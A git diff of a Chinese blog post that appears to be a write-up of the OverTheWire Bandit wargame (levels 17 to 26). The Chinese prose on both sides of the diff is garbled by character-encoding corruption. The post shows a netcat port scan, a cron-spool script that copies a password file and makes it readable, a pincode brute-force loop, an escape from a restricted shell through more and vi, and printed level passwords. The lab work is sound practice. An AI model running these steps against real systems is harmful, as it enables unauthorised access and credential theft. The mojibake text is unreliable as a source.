@@ -4,24 +4,24 @@ title: OverTheWire Bandit
 tags: ctf
 path: /assets/2015-7-26-overthewire-bandit
 ---
-ÌâÄ¿µØÖ·: [OverTheWire: Bandit](http://overthewire.org/wargames/bandit/).
+é¢˜ç›®åœ°å€: [OverTheWire: Bandit](http://overthewire.org/wargames/bandit/).
 
-¿¼µÄ¶¼ÊÇĞ© Linux ÏÂµÄ»ù±¾²Ù×÷, ËäÈ»ËµÊÇ»ù±¾²Ù×÷, ²»¹ıÄÇĞ©ÃüÁî¶¼Ã»ÓÃ¹ı, ËùÒÔ×öÁËÕâĞ©ÌâÒ²ÊÇÊÜÒæ·ËÇ³. ÆäÖĞ»¹ÓĞÓĞ¼¸µÀÌâºÜÓĞÒâË¼...~~ÓĞÒâË¼µÄÒâË¼ÊÇÎÒ²»»á×ö~~.
+è€ƒçš„éƒ½æ˜¯äº› Linux ä¸‹çš„åŸºæœ¬æ“ä½œ, è™½ç„¶è¯´æ˜¯åŸºæœ¬æ“ä½œ, ä¸è¿‡é‚£äº›å‘½ä»¤éƒ½æ²¡ç”¨è¿‡, æ‰€ä»¥åšäº†è¿™äº›é¢˜ä¹Ÿæ˜¯å—ç›ŠåŒªæµ…. å…¶ä¸­è¿˜æœ‰æœ‰å‡ é“é¢˜å¾ˆæœ‰æ„æ€...~~æœ‰æ„æ€çš„æ„æ€æ˜¯æˆ‘ä¸ä¼šåš~~.
 
-# WeChall ¼Æ·Ö°å
-OverTheWire Ê¹ÓÃ Wechall µÄÀ´¼Æ·Ö, ¾ßÌå²Î¼û [WeChall Scoreborad](http://overthewire.org/about/wechall.html)
+##WeChall è®¡åˆ†æ¿
+OverTheWire ä½¿ç”¨ Wechall çš„æ¥è®¡åˆ†, å…·ä½“å‚è§ [WeChall Scoreborad](http://overthewire.org/about/wechall.html)
 
-ÒòÎªÌâÄ¿¶¼ÔÚÔ¶³ÌµÄ ssh Ö÷»úÉÏ, ËùÒÔÄãĞèÒªÈÃÔ¶³ÌÖ÷»úÖªµÀÄãÊÇË­.
-ÔÚÄãµÄ `.bashrc` Àï¼ÓÉÏÁ½¸ö»·¾³±äÁ¿:
+å› ä¸ºé¢˜ç›®éƒ½åœ¨è¿œç¨‹çš„ ssh ä¸»æœºä¸Š, æ‰€ä»¥ä½ éœ€è¦è®©è¿œç¨‹ä¸»æœºçŸ¥é“ä½ æ˜¯è°.
+åœ¨ä½ çš„ `.bashrc` é‡ŒåŠ ä¸Šä¸¤ä¸ªç¯å¢ƒå˜é‡:
 
 ```bash
-export WECHALLUSER="ÄãÔÚ WeChall µÄÓÃ»§Ãû"
-export WECHALLTOKEN="ÄãÔÚ WeChall µÄ WarToken"
+export WECHALLUSER="ä½ åœ¨ WeChall çš„ç”¨æˆ·å"
+export WECHALLTOKEN="ä½ åœ¨ WeChall çš„ WarToken"
 ```
 
-WarToken ¿ÉÒÔÔÚ WeChall ÍøÕ¾µÄ [Account -> WarBoxes -> Your current WarToken](http://www.wechall.net/warboxes) »ñµÃ.
+WarToken å¯ä»¥åœ¨ WeChall ç½‘ç«™çš„ [Account -> WarBoxes -> Your current WarToken](http://www.wechall.net/warboxes) è·å¾—.
 
-ÔÚ `~/.ssh/config` ÖĞÌí¼Ó:
+åœ¨ `~/.ssh/config` ä¸­æ·»åŠ :
 
 ```
 Host *.labs.overthewire.org
@@ -29,33 +29,33 @@ SendEnv WECHALLTOKEN
 SendEnv WECHALLUSER
 ```
 
-ÔÚ ssh Á¬½ÓµÄÊ±ºò¾Í»á°ÑÄãµÄÕÊºÅĞÅÏ¢·¢ËÍ¸øÔ¶³ÌÖ÷»ú.
+åœ¨ ssh è¿æ¥çš„æ—¶å€™å°±ä¼šæŠŠä½ çš„å¸å·ä¿¡æ¯å‘é€ç»™è¿œç¨‹ä¸»æœº.
 
-ÔÚµÇÈëÒ»¸öĞÂµÄ¹Ø¿¨ºó, Ö´ĞĞ `wechall` ±ã¿É»ñµÃ¸Ã¹Ø¿¨µÄ·ÖÊı.
+åœ¨ç™»å…¥ä¸€ä¸ªæ–°çš„å…³å¡å, æ‰§è¡Œ `wechall` ä¾¿å¯è·å¾—è¯¥å…³å¡çš„åˆ†æ•°.
 
-#ÌâÄ¿
-##bandit17
+##é¢˜ç›®
+###bandit17
 
-> The password for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don¡¯t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.
+> The password for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which donâ€™t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.
 
-Òª´Ó 31000-32000 Ö®¼äµÄ¶Ë¿ÚÖĞÕÒ³öÓĞ¿ª·ÅµÄ²¢ÇÒÖ»ÊÇ SSL Á¬½ÓµÄ¶Ë¿Ú, Íù¸Ã¶Ë¿Ú·¢ËÍÉÏÒ»¹ØµÄÃÜÂë¾Í»á·µ»ØÏÂÒ»¹ØµÄÃÜÂë.
+è¦ä» 31000-32000 ä¹‹é—´çš„ç«¯å£ä¸­æ‰¾å‡ºæœ‰å¼€æ”¾çš„å¹¶ä¸”åªæ˜¯ SSL è¿æ¥çš„ç«¯å£, å¾€è¯¥ç«¯å£å‘é€ä¸Šä¸€å…³çš„å¯†ç å°±ä¼šè¿”å›ä¸‹ä¸€å…³çš„å¯†ç .
 
-ÕÒ³öËùÓĞÓĞÓ¦´ğµÄ¶Ë¿Ú:
+æ‰¾å‡ºæ‰€æœ‰æœ‰åº”ç­”çš„ç«¯å£:
 
 ```bash
 nc -v -w 2 localhost 31000-32000 2>/tmp.tmpxxx/log
 cat /tmp.tmpxxx/log | grep Succ
 ```
 
-`-v` ÓÃÀ´¸ø³öÁ¬½ÓµÄÏêÏ¸ĞÅÏ¢, `-w 2` Ö¸¶¨ timeout, ²»ÖªµÀÎªÊ²Ã´ `-v` µÄĞÅÏ¢ÊÇÖ±½ÓÊä³öµ½ `stderr` µÄ. `tmp/tmp.xxx` Ê¹ÓÃ `mktemp -d` ²úÉúµÄÁÙÊ±Ä¿Â¼.
+`-v` ç”¨æ¥ç»™å‡ºè¿æ¥çš„è¯¦ç»†ä¿¡æ¯, `-w 2` æŒ‡å®š timeout, ä¸çŸ¥é“ä¸ºä»€ä¹ˆ `-v` çš„ä¿¡æ¯æ˜¯ç›´æ¥è¾“å‡ºåˆ° `stderr` çš„. `tmp/tmp.xxx` ä½¿ç”¨ `mktemp -d` äº§ç”Ÿçš„ä¸´æ—¶ç›®å½•.
 
-×îºóÓĞÓ¦´ğµÄÖ»ÓĞÎå¸ö¶Ë¿Ú, °¤¸ö°¤¸öÊÔ.
+æœ€åæœ‰åº”ç­”çš„åªæœ‰äº”ä¸ªç«¯å£, æŒ¨ä¸ªæŒ¨ä¸ªè¯•.
 
 ```bash
 openssl s_client -connect localhost:31xxx -ssl3 -quiet
 ```
 
-·¢ÏÖÊÇ 31790 ¶Ë¿Ú, ·µ»ØÒ»¸ö RSA Ë½Ô¿, ËùÒÔ:
+å‘ç°æ˜¯ 31790 ç«¯å£, è¿”å›ä¸€ä¸ª RSA ç§é’¥, æ‰€ä»¥:
 
 ```bash
 openssl s_client -connect localhost:31790 -ssl3 -quiet > bandit17.private
@@ -67,36 +67,37 @@ cat /etc/bandit_pass/bandit17
 > key:xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
 
 
-##bandit21
+###bandit21
 
 > There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).
 >
 > **NOTE:** To beat this level, you need to login twice: once to run the setuid command, and once to start a network daemon to which the setuid will connect.<br>
 > **NOTE 2:** Try connecting to your own network daemon to see if it works as you think
 
-`bandit20` µÄ¼ÒÄ¿Â¼ÏÂÌá¹©ÁËÒ»¸ö³ÌĞò `suconnect`, »á´ÓÄãÖ¸¶¨µÄ¶Ë¿Ú¶ÁÈ¡ `bandit20` µÄÃÜÂë, Èç¹ûÕıÈ·µÄ»°·µ»Ø±¾¹Ø¿¨µÄÃÜÂë.
+`bandit20` çš„å®¶ç›®å½•ä¸‹æä¾›äº†ä¸€ä¸ªç¨‹åº `suconnect`, ä¼šä»ä½ æŒ‡å®šçš„ç«¯å£è¯»å– `bandit20` çš„å¯†ç , å¦‚æœæ­£ç¡®çš„è¯è¿”å›æœ¬å…³å¡çš„å¯†ç .
 
-> echo GbKksEFF4yrVs6il55v6gwY5aVje5f0j | nc -l -p 1234 & ./suconnect 1234
+```bash
+echo GbKksEFF4yrVs6il55v6gwY5aVje5f0j | nc -l -p 1234 & ./suconnect 1234
+```
 
-ÕâÀïÖ÷ÒªÊÇ `&` µÄÓÃ·¨, Ê¹Á½¸öÃüÁîÍ¬Ê±Ö´ĞĞ.
+è¿™é‡Œä¸»è¦æ˜¯ `&` çš„ç”¨æ³•, ä½¿ä¸¤ä¸ªå‘½ä»¤åŒæ—¶æ‰§è¡Œ.
 
-#bandit24
+
+###bandit24
 > A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
 >
 > **NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level! <br>
->**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around¡­ 
+>**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy aroundâ€¦ 
 
-ÕâÌâÎÒ¾õµÃÓĞµãÒâË¼.
+è¿™é¢˜æˆ‘è§‰å¾—æœ‰ç‚¹æ„æ€.
 
-cron ÊÇÒ»¸ö¶¨Ê±Ö´ĞĞ¹¤¾ß, ÈÎÎñ¿ÉÒÔÍ¨¹ıÃüÁî `crontab` Éè¶¨, ÅäÖÃ´¢´æÔÚ `/etc/cron.d` ÖĞ, Ã¿·ÖÖÓ cron »á±»´¥·¢Ò»´Î, µ½¸ÃÄ¿Â¼¼ì²âÊÇ·ñÓĞÈÎÎñÒªÖ´ĞĞ.
-
-/etc/cron.d/cronjob_bandit24:
+cron æ˜¯ä¸€ä¸ªå®šæ—¶æ‰§è¡Œå·¥å…·, ä»»åŠ¡å¯ä»¥é€šè¿‡å‘½ä»¤ `crontab` è®¾å®š, é…ç½®å‚¨å­˜åœ¨ `/etc/cron.d` ä¸­, æ¯åˆ†é’Ÿ cron ä¼šè¢«è§¦å‘ä¸€æ¬¡, åˆ°è¯¥ç›®å½•æ£€æµ‹æ˜¯å¦æœ‰ä»»åŠ¡è¦æ‰§è¡Œ: `cat /etc/cron.d/cronjob_bandit24`
 
 ```bash
 * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
 ```
 
-ËùÒÔËµ `/usr/bin/cronjob_bandit24.sh` »áÃ¿·ÖÖÓÖ´ĞĞÒ»´Î, ¿´¿´Õâ¸ö½Å±¾µÄÄÚÈİÊÇÊ²Ã´:
+æ‰€ä»¥è¯´ `/usr/bin/cronjob_bandit24.sh` ä¼šæ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡, çœ‹çœ‹è¿™ä¸ªè„šæœ¬çš„å†…å®¹æ˜¯ä»€ä¹ˆ:
 
 ```bash
 #!/bin/bash
@@ -116,35 +117,35 @@ do
 done
 ```
 
-Ã¿´Î¶¼Ö´ĞĞ `/var/spool/bandit24` ÏÂµÄËùÓĞ¿ÉÖ´ĞĞÎÄ¼ş, Ö®ºóÉ¾³ı. µ±È»ÊÇÒÔ `bandit24` µÄÉí·İÖ´ĞĞÕâĞ©²Ù×÷.
+æ¯æ¬¡éƒ½æ‰§è¡Œ `/var/spool/bandit24` ä¸‹çš„æ‰€æœ‰å¯æ‰§è¡Œæ–‡ä»¶, ä¹‹ååˆ é™¤. å½“ç„¶æ˜¯ä»¥ `bandit24` çš„èº«ä»½æ‰§è¡Œè¿™äº›æ“ä½œ.
 
-ËùÒÔÎÒÃÇ¿ÉÒÔ¹¹ÔìÒ»¸ö½Å±¾ÈÃËûÖ´ĞĞ.
+æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªè„šæœ¬è®©ä»–æ‰§è¡Œ.
 
- ```bash
+```bash
 #!/bin/sh
 cp /etc/bandit_pass/bandit24 /tmp/tmp.xxx/psw
 chmod 666 /tmp/tmp.xxx/
 ```
 
-Õâ¸ö½Å±¾°ÑÃÜÂëÎÄ¼ş¸´ÖÆµ½ÁÙÊ±Ä¿Â¼²¢ÇÒ¸ü¸ÄËûµÄÈ¨ÏŞ(ÖÁÉÙÈÃËùÓĞÈË¿É¶Á).
+è¿™ä¸ªè„šæœ¬æŠŠå¯†ç æ–‡ä»¶å¤åˆ¶åˆ°ä¸´æ—¶ç›®å½•å¹¶ä¸”æ›´æ”¹ä»–çš„æƒé™(è‡³å°‘è®©æ‰€æœ‰äººå¯è¯»).
 
-ÖĞ¼ä³öÁËºÜ¶àÓŞ´ÀµÄ´íÎó, ±ÈÈçĞ´´íÄ¿Â¼,¸ã´í `sh` µÄÂ·¾¶Ê²Ã´µÄ, ÁíÍâ, ²»ÄÜÓÃÖØ¶¨Ïòµ¼³ö `bandit24` µÄÃÜÂë, ÒòÎªÃ»ÓĞÈ¨ÏŞ(ÎªÊ²Ã´Ã»ÓĞÈ¨ÏŞÎÒ¾Í²»Çå³şÁË). 
+ä¸­é—´å‡ºäº†å¾ˆå¤šæ„šè ¢çš„é”™è¯¯, æ¯”å¦‚å†™é”™ç›®å½•,æé”™ `sh` çš„è·¯å¾„ä»€ä¹ˆçš„, å¦å¤–, ä¸èƒ½ç”¨é‡å®šå‘å¯¼å‡º `bandit24` çš„å¯†ç , å› ä¸ºæ²¡æœ‰æƒé™(ä¸ºä»€ä¹ˆæ²¡æœ‰æƒé™æˆ‘å°±ä¸æ¸…æ¥šäº†). 
 
-½Å±¾Ğ´Íêºó, `chmod +x`, ÔÙ°ÑËü¸´ÖÆµ½ `/var/spool/bandit24` Ä¿Â¼ÏÂ, ¼ÇµÃ±¸·İ, Ã¿¸ôÒ»·ÖÖÓ¸ÃÄ¿Â¼¾Í»á±»Çå¿Õ.
+è„šæœ¬å†™å®Œå, `chmod +x`, å†æŠŠå®ƒå¤åˆ¶åˆ° `/var/spool/bandit24` ç›®å½•ä¸‹, è®°å¾—å¤‡ä»½, æ¯éš”ä¸€åˆ†é’Ÿè¯¥ç›®å½•å°±ä¼šè¢«æ¸…ç©º.
 
-±È½ÏÓĞÒâË¼µÄÊÇ, ÄãÔÚÄÇ¸öÄ¿Â¼ÏÂ¶àË¢ĞÂ¼¸´Î, ÓĞÊ±¿ÉÒÔ¿´µ½±ğÈËĞ´µÄ½Å±¾.
+æ¯”è¾ƒæœ‰æ„æ€çš„æ˜¯, ä½ åœ¨é‚£ä¸ªç›®å½•ä¸‹å¤šåˆ·æ–°å‡ æ¬¡, æœ‰æ—¶å¯ä»¥çœ‹åˆ°åˆ«äººå†™çš„è„šæœ¬.
 
 
 #bandit25
 > A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinaties, called brute-forcing.
 
-ÓĞÒ»¸öÊØ»¤½ø³ÌÔÚ `30002` ¶Ë¿Ú¼àÌı, °Ñ `bandit24` µÄÃÜÂëºÍÒ»¸öËÄÎ»Êı×Ö×é³ÉµÄ pincode ´«¸øËü, Èç¹ûÃÜÂëºÍ pincode ¶¼ÕıÈ·µÄ»°»á·µ»Ø `bandit25` µÄÃÜÂë.
+æœ‰ä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹åœ¨ `30002` ç«¯å£ç›‘å¬, æŠŠ `bandit24` çš„å¯†ç å’Œä¸€ä¸ªå››ä½æ•°å­—ç»„æˆçš„ pincode ä¼ ç»™å®ƒ, å¦‚æœå¯†ç å’Œ pincode éƒ½æ­£ç¡®çš„è¯ä¼šè¿”å› `bandit25` çš„å¯†ç .
 
-ËùÒÔ×ÔÈ»ÊÇ±¬ÆÆÁË, Ö±½ÓÓÃ nc Á´½Ó¸Ã¶Ë¿Ú»áÌáÊ¾:
+æ‰€ä»¥è‡ªç„¶æ˜¯çˆ†ç ´äº†, ç›´æ¥ç”¨ nc é“¾æ¥è¯¥ç«¯å£ä¼šæç¤º:
 
 > I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
 
-ËùÒÔ°´ÕÕ¸ñÊ½À´, Éú³É 10000 ¸ö ÃÜÂë + pincode µÄĞòÁĞ´«¸ø¸Ã¶Ë¿Ú.
+æ‰€ä»¥æŒ‰ç…§æ ¼å¼æ¥, ç”Ÿæˆ 10000 ä¸ª å¯†ç  + pincode çš„åºåˆ—ä¼ ç»™è¯¥ç«¯å£.
 
 ```bash
 for i in {0000..9999}; do echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" >> /tmp/pin; done
@@ -152,20 +153,21 @@ cat /tmp/pin | nc localhost 30002 > /tmp/log
 cat /tmp/log | grep "Corr" -n1
 ```
 
-ÆäÊµ´ğ°¸¾ÍÊÇ×îºóÒ»¸ö¶Ë¿Ú...
+å…¶å®ç­”æ¡ˆå°±æ˜¯æœ€åä¸€ä¸ªç«¯å£...
 
 > 5670-Wrong! Please enter the correct pincode. Try again.
 > 5671:Correct!
 > 5672-The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
 
+
 #bandit26
-> Logging in to bandit26 from bandit25 should be fairly easy¡­ The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.
+> Logging in to bandit26 from bandit25 should be fairly easyâ€¦ The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.
 
-ÕâÊÇ 26 ¸ö level ÀïÃæ×îÓĞÒâË¼µÄÒ»µÀÌâµÄ, ¿ÉÏ§ÎÒÃ»ÄÜ×ö³öÀ´...  ²Î¿¼µÄ´ğ°¸ÊÇÕâ¸ö: [overthewire-bandit-level-26](http://codebluedev.blogspot.com/2015/07/overthewire-bandit-level-26.html)
+è¿™æ˜¯ 26 ä¸ª level é‡Œé¢æœ€æœ‰æ„æ€çš„ä¸€é“é¢˜çš„, å¯æƒœæˆ‘æ²¡èƒ½åšå‡ºæ¥...  å‚è€ƒçš„ç­”æ¡ˆæ˜¯è¿™ä¸ª: [overthewire-bandit-level-26](http://codebluedev.blogspot.com/2015/07/overthewire-bandit-level-26.html)
 
-Ìâ¸ÉÀïËµ `bandit26` µÄ shell ²¢²»ÊÇÆÕÍ¨µÄ `/bin/bash`.
+é¢˜å¹²é‡Œè¯´ `bandit26` çš„ shell å¹¶ä¸æ˜¯æ™®é€šçš„ `/bin/bash`.
 
-`bandit25` µÄ¼ÒÄ¿Â¼ÏÂ¸ø³öÁË `bandit26` µÄË½Ô¿, µÇÂ¼ÉÏÈ¥Ö»ÊÇ´òÓ¡³öÁË bandit26 µÄ ASCII Art ¾ÍÍË³öÁË.
+`bandit25` çš„å®¶ç›®å½•ä¸‹ç»™å‡ºäº† `bandit26` çš„ç§é’¥, ç™»å½•ä¸Šå»åªæ˜¯æ‰“å°å‡ºäº† bandit26 çš„ ASCII Art å°±é€€å‡ºäº†.
 
 ```
   _                     _ _ _   ___   __  
@@ -176,12 +178,12 @@ cat /tmp/log | grep "Corr" -n1
  |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
 ```
 
-Ö´ĞĞ `cat /etc/passwd | grep bandit26` µÃµ½:
+æ‰§è¡Œ `cat /etc/passwd | grep bandit26` å¾—åˆ°:
 
 > **bandit26**:x:11026:11026:bandit level 26:/home/**bandit26**:/usr/bin/showtext
 
-(ÎÒµ½ÕâÀï¾Í¿¨×¡ÁË)
-·¢ÏÖ `showtext` ÊÇÒ»¸ö shell ½Å±¾, ÄÚÈİÈçÏÂ
+(æˆ‘åˆ°è¿™é‡Œå°±å¡ä½äº†)
+å‘ç° `showtext` æ˜¯ä¸€ä¸ª shell è„šæœ¬, å†…å®¹å¦‚ä¸‹
 
 ```bash
 #!/bin/sh
@@ -190,26 +192,29 @@ more ~/text.txt
 exit 0
 ```
 
-¼´ ssh Á¬ÉÏÈ¥ºóÖ´ĞĞÄ¬ÈÏ shell, ÓÃ `more` ´òÓ¡³öÁË ~/text.txt Ö®ºó¾ÍÍË³öÁË, ÈçÍ¼:
+å³ ssh è¿ä¸Šå»åæ‰§è¡Œé»˜è®¤ shell, ç”¨ `more` æ‰“å°å‡ºäº† ~/text.txt ä¹‹åå°±é€€å‡ºäº†, å¦‚å›¾:
+
 ![1]({{ page.path }}/1.png)
 
-Ò»Á¬ÉÏ¾ÍÍË³ö, ÄÇÎÒÃÇÔõÃ´ÈÃËüÖ´ĞĞÎÒÃÇÏëÒªµÄÃüÁîÄØ? Ö±½ÓÓÃ ssh µÄ `-t` + ÃüÁî ÊÇ²»ĞĞµÄ, Õâ¸öÃüÁî²»»á±»½âÊÍ, ÒòÎª `bash` Ã»ÓĞÖ´ĞĞ.
+ä¸€è¿ä¸Šå°±é€€å‡º, é‚£æˆ‘ä»¬æ€ä¹ˆè®©å®ƒæ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤å‘¢? ç›´æ¥ç”¨ ssh çš„ `-t` + å‘½ä»¤ æ˜¯ä¸è¡Œçš„, è¿™ä¸ªå‘½ä»¤ä¸ä¼šè¢«è§£é‡Š, å› ä¸º `bash` æ²¡æœ‰æ‰§è¡Œ.
 
-ÕıÈ·´ğ°¸ÊÇÍ¨¹ı `more`.
+æ­£ç¡®ç­”æ¡ˆæ˜¯é€šè¿‡ `more`.
 
-`more` ÔÚÒªÊä³öµÄÄÚÈİĞĞÊı¶àÓÚÖÕ¶ËĞĞÊıµÄÊ±ºò»áÍ£ÏÂÀ´, µÈ´ıÄã·­Ò³, ËùÒÔÎÒÃÇ°Ñµ±Ç°µÄÖÕ¶Ëµ÷Ğ¡, ²î²»¶àËÄĞĞ, ÔÙ´Î shh ÉÏÈ¥, `more` ¾ÍÍ£ÏÂÀ´ÁË. (ºÃÄÔ¶´)
+`more` åœ¨è¦è¾“å‡ºçš„å†…å®¹è¡Œæ•°å¤šäºç»ˆç«¯è¡Œæ•°çš„æ—¶å€™ä¼šåœä¸‹æ¥, ç­‰å¾…ä½ ç¿»é¡µ, æ‰€ä»¥æˆ‘ä»¬æŠŠå½“å‰çš„ç»ˆç«¯è°ƒå°, å·®ä¸å¤šå››è¡Œ, å†æ¬¡ shh ä¸Šå», `more` å°±åœä¸‹æ¥äº†. (å¥½è„‘æ´)
+
 ![2]({{ page.path }}/2.png)
 
-ÔÚ `more` ÀïÃæ°´ v, ÏµÍ³»áµ÷ÓÃÄ¬ÈÏµÄ±à¼­Æ÷À´±à¼­Õâ¸öÎÄ¼ş, Ä¬ÈÏÊÇ `vi`, ÓĞÁË `vi`, ¾ÍÏàµ±ÓÚÓĞÁËÒ»¸öÖÕ¶Ë.
+åœ¨ `more` é‡Œé¢æŒ‰ v, ç³»ç»Ÿä¼šè°ƒç”¨é»˜è®¤çš„ç¼–è¾‘å™¨æ¥ç¼–è¾‘è¿™ä¸ªæ–‡ä»¶, é»˜è®¤æ˜¯ `vi`, æœ‰äº† `vi`, å°±ç›¸å½“äºæœ‰äº†ä¸€ä¸ªç»ˆç«¯.
 
-ÔÚÃüÁîÄ£Ê½Ö´ĞĞ `:r /etc/bandit_pass/bandit26`, ÃÜÂëµÄÄÚÈİ¾Í»á±»¶ÁÈë.
+åœ¨å‘½ä»¤æ¨¡å¼æ‰§è¡Œ `:r /etc/bandit_pass/bandit26`, å¯†ç çš„å†…å®¹å°±ä¼šè¢«è¯»å…¥.
+
 ![3]({{ page.path }}/3.png)
 
-Òª´ò¿ª `sh` µÄ»°, ¿ÉÒÔ:
+è¦æ‰“å¼€ `sh` çš„è¯, å¯ä»¥:
 
 ```vimL
 :set shell sh=/bin/sh
 :sh
 ```
 
-ÕâÑù¾Í¿ÉÒÔÖ´ĞĞ `wechall` ÄÃ·ÖÁË.
+è¿™æ ·å°±å¯ä»¥æ‰§è¡Œ `wechall` æ‹¿åˆ†äº†.
